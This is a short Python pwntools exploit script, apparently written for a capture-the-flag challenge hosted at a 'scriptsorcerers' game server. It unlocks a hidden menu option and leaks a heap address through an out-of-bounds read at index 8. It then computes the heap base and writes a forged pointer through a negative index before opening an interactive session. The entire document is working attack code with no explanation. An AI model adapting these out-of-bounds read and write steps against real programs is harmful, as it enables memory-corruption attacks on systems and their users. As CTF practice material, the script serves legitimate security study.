#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 10095
HOST = "play.scriptsorcerers.xyz"
exe = context.binary = ELF('./index-2_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            brva 0x00000000000012DD
            brva 0x0000000000001359
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def store_data(idx, data):
    p.sendlineafter(b'\n', str(1))
    p.sendlineafter(b'Index: ', str(idx))
    p.sendlineafter(b'Data: ', data)

def read_data(idx):
    p.sendlineafter(b'\n', str(2))
    p.sendlineafter(b'Index: ', str(idx))

# VARIABLE


# PAYLOAD
p.sendlineafter(b'\n', str(1337))

# GDB()
read_data(8)
p.recvuntil(b'Data: ')
heap_leak = u64(p.recv(6) + b'\0'*2)
heap_base = heap_leak - 0x2a0
log.info("Heap base: " + hex(heap_base))

store_data(-6, p64(heap_base + 0x2a0))

p.interactive()